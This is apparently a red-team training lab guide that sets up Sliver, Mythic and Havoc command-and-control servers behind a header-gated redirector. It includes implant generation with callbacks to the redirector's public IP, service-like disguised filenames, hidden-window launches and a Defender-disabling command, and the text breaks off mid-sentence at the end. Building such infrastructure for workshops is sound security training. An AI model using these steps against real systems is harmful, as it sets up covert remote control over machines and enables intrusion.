# redStack: Boot-To-Breach Red Team Platform (C2 Configuration Guide, Tunneled Access)

Stand up all three C2 backends behind the redirector and confirm a working test beacon from each, using the Windows operator workstation as the test platform. This picks up where DEPLOY leaves off (stack live, hosts verified, tunnel up, ShadowGate reachable) and hands off to ATTACK with three validated callback paths.

Order is Sliver, then Mythic, then Havoc. Each ends with a beacon that stays running as a persistent heartbeat, so if anything in the redirector or a listener breaks later, a dead beacon tells you before the attack does.

| At a glance   |                                                                     |
| ------------- | ------------------------------------------------------------------- |
| Depends on    | DEPLOY complete through Phase 4 (tunnel up, target reachable)        |
| Test platform | Windows operator workstation (via Guacamole RDP)                    |
| Callback host | Redirector public Elastic IP, 443/HTTPS for all three C2s (see Callback architecture)  |
| C2 order      | Sliver, Mythic, Havoc                                                |
| End state     | Three live beacons on the Windows host, left running as heartbeats   |
| Hands off to  | ATTACK (chain against ShadowGate)                                   |

---

## Callback architecture (read this first)

Every beacon in this lab calls back to the redirector's public Elastic IP on 443 (HTTPS). The redirector then gates and routes the request to the right C2 backend. Three things must line up or the caller gets the CloudEdge decoy page instead of a session.

Callback host. Use the redirector public EIP from `deployment_info.txt`, as `https://<REDIR_PUBLIC_IP>/...`. In Tunneled Access the public EIP is always live and is the only callback host that works; the `tun0` IP does not work as a callback because HSL does not route VPN client IPs back to the target. This is why the Windows test beacons here point at the public EIP: it is the exact path ShadowGate will use in ATTACK.

Header gate. The redirector drops anything without `X-Request-ID: <TOKEN>`, where `<TOKEN>` is the `X-Request-ID` value from `deployment_info.txt`. Wrong or missing header returns the decoy page.

URI prefix. Each C2 has its own prefix. The redirector strips the prefix for Sliver and Mythic before forwarding, and preserves it for Havoc:

| C2     | URI prefix                | Redirector behavior   | Callback (demon to redirector) | Backend (redirector to C2) |
| ------ | ------------------------- | --------------------- | ------------------------------ | -------------------------- |
| Sliver | `/cloud/storage/objects/` | strip prefix, forward | 443 (HTTPS)                    | 443 (HTTPS)                |
| Mythic | `/cdn/media/stream/`      | strip prefix, forward | 443 (HTTPS)                    | 443 (HTTPS)                |
| Havoc  | `/edge/cache/assets/`     | preserve full path    | 443 (HTTPS)                    | 443 (HTTPS)                |

The redirector terminates the beacon's TLS on 443 (self-signed in Tunneled Access, with the public IP as SAN), gates on the header and URI, then re-encrypts to each C2's own TLS listener on 443. Every leg is HTTPS end to end: beacon to redirector, and redirector to backend. Both the redirector cert and the backend C2 certs are self-signed, so the beacons skip cert verification (or trust the cert) and the redirector proxies with verification disabled (`SSLProxyVerify none`).

Test platform. All three beacons run on the Windows operator workstation. The Mythic UI and both file-transfer paths live there, and it can reach the redirector public EIP the same way ShadowGate will. Defender is disabled on the lab Windows host by default so unobfuscated implants run; if you re-enabled it, re-disable with `Set-MpPreference -DisableRealtimeMonitoring $true` or the beacon is quarantined.

Values you will reuse below, all from `terraform output deployment_info` (also in `redStack/deployment_info.txt`): the redirector public EIP `<REDIR_PUBLIC_IP>`, the header token `<TOKEN>`, and the lab password `<LAB_PASSWORD>`.

---

## Phase A: Sliver

Sliver drives the attack in ATTACK, so it is set up first and in the most depth. Sliver ships with the `redstack` C2 profile pre-generated (the `X-Request-ID` token is baked in) and the `admin` operator config pre-installed.

### Step A1. Open the Sliver host

From the Windows operator, use the MobaXterm **Sliver (SSH)** bookmark under the redStack Lab session folder. Guacamole > Sliver (SSH) also works; MobaXterm is preferred for its built-in SFTP panel, used in Step A4.

Success: you land at `admin@sliver:~$`.

If it fails: Sliver has no public IP; both paths route through the internal VPC. If SSH hangs at the banner, the host may be memory-exhausted from a prior `generate` on an undersized instance. Confirm `sliver_instance_type = "t3.medium"` and reboot the instance if needed.

### Step A2. Connect the client and start the listener

```bash
sliver-client
```

The pre-installed `admin.cfg` loads automatically; you land at `sliver >` within a couple seconds.

First session per deployment only, import the profile (Sliver persists it afterward):

```text
c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
```

Start the HTTPS listener on port 443. Sliver auto-generates a self-signed cert for it, which the redirector accepts (it re-encrypts to this listener with verification disabled):

```text
https --lhost 0.0.0.0 --lport 443
jobs
```

Success: `jobs` lists the HTTPS listener as an active job.

If it fails: "profile with name 'redstack' already exists" is expected on reconnects, ignore it. If the client hangs on connect, `sudo systemctl restart sliver` and wait ~10 seconds.

### Step A3. Generate the implant

```text
generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/sysProxy.exe
```

The `/cloud/storage/objects/` prefix is what the redirector matches, strips, and forwards to the Sliver HTTPS listener on 443. Wrong prefix = decoy. Cross-compile takes ~60 to 90 seconds.

This is the only Sliver implant you build all workshop. It stays at `/tmp/sysProxy.exe` on the Sliver host and ATTACK reuses it against ShadowGate, so there is no regenerate step later. The name is deliberately service-like, first letter maps to the C2 (s = Sliver).

Success: `[*] Implant saved to /tmp/sysProxy.exe`.

If it fails: SSH hang during generate points at an undersized instance (see Step A1). If it compiles but is owned by root and cannot be pulled, the umask override is missing (`/etc/systemd/system/sliver.service.d/umask.conf`).

### Step A4. Transfer to Windows and execute

In MobaXterm, `cd /tmp` in the Sliver SSH session; the SFTP panel follows the directory. Right-click `sysProxy.exe` > Download to `C:\Users\Administrator\Desktop\`. Or from PowerShell on the Windows host:

```powershell
scp admin@sliver:/tmp/sysProxy.exe C:\Users\Administrator\Desktop\sysProxy.exe
```

Authenticate with `<LAB_PASSWORD>`. Then launch it:

```powershell
Start-Process -FilePath "C:\Users\Administrator\Desktop\sysProxy.exe" -WindowStyle Hidden
```

Success: within ~10 seconds Sliver prints an incoming session notification.

If it fails: check Defender quarantine (Event Viewer) and confirm the implant URL used `https://` with the full `/cloud/storage/objects/` prefix.

### Step A5. Confirm and leave running

```text
sessions
use [SESSION_ID]
whoami
ps
```

Success: `whoami` returns `windows\administrator`; `ps` returns the process table. Leave this session connected. It is your Sliver heartbeat for the rest of the workshop; do not kill it.

If it fails: see the wiki Sliver > Troubleshooting > "Implant compiles but never calls back" for the ordered checklist (listener, network path, URL, header, Defender).

---

## Phase B: Mythic

Mythic ships with the HTTP profile and Apollo agent pre-installed, the token pre-baked into the HTTP profile, and the web UI reachable from the Windows operator browser only.

### Step B1. Confirm the stack is up

Guacamole > Mythic (SSH), or the MobaXterm bookmark:

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

Success: `apollo` and `http` both show `running` under Installed Services.

If either shows `Created` (installed but not started) or is missing, install and start each, one command at a time (do not lump them, and do not chain `stop && start`):

```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo
```

```bash
sudo ./mythic-cli restart
```

If `status` still shows either as `Created` rather than `running`, start the two services explicitly (this is the usual fix for the post-install `Created` state):

```bash
sudo ./mythic-cli start apollo http
```

```bash
sudo ./mythic-cli status
```

Portal note: on a cold boot the web UI can take ~3 minutes beyond the containers coming up. nginx crash-loops on a missing self-signed cert until `mythic_server` writes it, then serves normally. Red `cannot load certificate` lines in `mythic-cli logs mythic_nginx` during that window are expected. Browse to the portal only after the login page returns, not during the crash-loop.

### Step B2. Log in and confirm the HTTP profile

From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443`. Login `mythic_admin` / `<LAB_PASSWORD>`. Go to Installed Services > C2 Profiles; the `http` row should show Container Status Online and C2 Server Status Accepting Connections. If Stopped, click Start Profile.

Success: HTTP profile online and accepting connections.

If it fails: the stack takes 5 to 10 minutes after cloud-init. If login fails, confirm the username is `mythic_admin` and pull the password with `sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD`.

### Step B3. Build the Apollo payload

Left sidebar > Create Payload:

1. Target OS: Windows.
2. Payload: Apollo. Output Format: `WinExe`.
3. Commands: accept the default set (includes `shell`, `ps`, `run`, `upload`).
4. C2 Profiles: pick `http`, click + INCLUDE PROFILE, then configure:

   | Field                      | Value                                          |
   | -------------------------- | ---------------------------------------------- |
   | `callback_host`            | `https://<REDIR_PUBLIC_IP>`                    |
   | `callback_port`            | `443`                                          |
   | `callback_interval`        | `10` (seconds)                                 |
   | `callback_jitter`          | `20` (percent)                                 |
   | `post_uri`                 | `cdn/media/stream/update` (no leading `/`)     |
   | `headers`                  | + Custom, KEY `X-Request-ID`, VALUE `<TOKEN>`  |
   | `encrypted_exchange_check` | leave enabled                                  |

5. Build: Next, name it `msDiag.exe` (service-like, m = Mythic), Create Payload.

Success: Payload successfully built popup with a Download link. Save to `C:\Users\Administrator\Downloads\`.

If it fails: if the build hangs > 3 minutes, `sudo ./mythic-cli logs apollo`.

### Step B4. Execute and confirm

The payload is already on the Windows host (the UI runs there). From PowerShell:

```powershell
Start-Process -FilePath "C:\Users\Administrator\Downloads\msDiag.exe" -WindowStyle Hidden
```

In the Mythic UI, open Active Callbacks (phone icon). A `windows` / Administrator row appears within ~10 seconds. Open its tasking pane and run `ps` to confirm.

Success: callback registered, `ps` returns the process table. Leave the callback active as the Mythic heartbeat.

If it fails: see the wiki Mythic > Troubleshooting > "Callback never arrives" (listener, network path via redirector curl test, build params header/`post_uri`, Defender).

---

## Phase C: Havoc

Havoc compiles from source once per deploy (~9 min). If you did not kick off the build in DEPLOY Step 10, start it now and set up nothing else until it finishes. Havoc's `/edge/cache/assets/` prefix is preserved (not stripped) by the redirector, so the listener URI must carry the full prefix.

### Step C1. Build (once per deploy) and verify the teamserver

Guacamole > Havoc (SSH):

```bash
~/build_havoc.sh          # skip if already built this deploy
tail -f ~/havoc_build.log # optional, watch for "Havoc Build Complete"
```

Then confirm the teamserver:

```bash
sudo systemctl status havoc
sudo ss -tlnp | grep 40056
```

Success: `active (running)` and port 40056 listening. The build ends by starting the teamserver.

If it fails: `grep -E 'error|fail|FAIL' ~/havoc_build.log`. Out-of-memory on the Qt5 compile means bump to `t3.large` and re-run (`build_havoc.sh` is incremental).

### Step C2. Connect Katana

Guacamole > Havoc Desktop (VNC). Double-click Havoc Client; on first launch click Mark Executable, then double-click again. Login dialog:

| Field    | Value                     |
| -------- | ------------------------- |
| Name     | `admin`                   |
| Host     | `localhost`               |
| Port     | `40056`                   |
| Username | `admin`                   |
| Password | `<LAB_PASSWORD>`          |

Success: Katana opens on the Sessions tab (empty).

If it fails: confirm the teamserver is listening (Step C1) and the password matches `/opt/Havoc/profiles/default.yaotl`.

### Step C3. Create the listener

Menu: View > Listeners > Add.

| Field       | Value                                                   |
| ----------- | ------------------------------------------------------- |
| Name        | `https`                                                 |
| Payload     | `Https`                                                 |
| Hosts       | `<REDIR_PUBLIC_IP>`, then Add                           |
| Host (Bind) | `0.0.0.0`                                               |
| PortBind    | `443`                                                   |
| PortConn    | `443`                                                   |
| Headers     | `X-Request-ID: <TOKEN>`, then Add                       |
| Uris        | `/edge/cache/assets/update`, then Add (keep the prefix) |
| UserAgent   | leave default                                           |

`Payload: Https` makes the teamserver stand up its own TLS listener on 443 (the teamserver has `CAP_NET_BIND_SERVICE`, so binding 443 as `admin` works). The redirector re-encrypts to it. Enter the header key as the full `X-Request-ID`, not just `ID`.

Save.

Success: the `http` listener shows running in the Listeners tab.

If it fails: listener won't start usually means a port already bound or a malformed URI.

### Step C4. Generate the demon

Menu: Attack > Payloads.

1. Listener: `http`.
2. Arch: `x64`. Format: `Windows Exe`.
3. Injection > Spawn64: `C:\Windows\System32\notepad.exe`
4. Injection > Spawn32: `C:\Windows\SysWOW64\notepad.exe`
5. Leave Sleep technique, Indirect Syscall, AMSI/ETW at defaults. Generate.

Spawn64 and Spawn32 are required; blank causes a silent build failure. Demon saves to `/home/admin/Desktop/demon.x64.exe`.

Success: `demon.x64.exe` on the Havoc desktop.

If it fails: silent failure is almost always empty Spawn fields.

### Step C5. Transfer, execute, confirm, leave running

Havoc always writes the demon as `demon.x64.exe`; rename it to the service-like name on transfer (h = Havoc) so it matches the ATTACK reuse. From PowerShell on the Windows host, one command at a time:

```powershell
scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\hlpUpdate.exe
```

```powershell
Start-Process -FilePath "C:\Users\Administrator\Desktop\hlpUpdate.exe" -WindowStyle Hidden
```

A session appears in the Havoc Sessions tab within ~10 seconds. Right-click > Interact:

```text
shell whoami
ps
```

Success: `whoami` returns `windows\administrator`. Leave the demon running as the Havoc heartbeat.

If it fails: see the wiki Havoc > Troubleshooting > "Demon doesn't call back" (listener running, URI prefix, header, Defender, Spawn paths).

---

## All three up: confirm and monitor as heartbeats

With Sliver, Mythic, and Havoc beacons live, confirm the full front door in one shot from the redirector (Guacamole > Redirector SSH):

```bash
sudo /home/admin/test_redirector.sh
```

All three entries under "Testing direct backend connectivity" should show `OK`.

Leave all three beacons running. They are your heartbeats: if the redirector, a listener, or VPC peering breaks during the workshop, the af